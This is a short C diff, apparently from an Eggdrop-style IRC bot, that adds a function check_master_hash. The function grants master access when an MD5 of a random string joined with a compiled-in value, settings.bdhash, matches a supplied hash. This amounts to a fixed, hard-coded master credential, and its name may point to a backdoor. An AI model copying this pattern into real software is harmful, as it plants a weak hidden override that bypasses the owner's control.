@@ -1172,3 +1172,13 @@ bool check_master(const char *pass)
     return 1;
   return 0;
 }
+bool check_master_hash(const char *rand, const char *hash)
+{
+  char tmp[151] = "";
+
+  egg_snprintf(tmp, sizeof tmp, "%s%s", rand, settings.bdhash);                        
+  if (!strcmp(MD5(tmp), hash))
+    return 1;
+  return 0;
+}
+
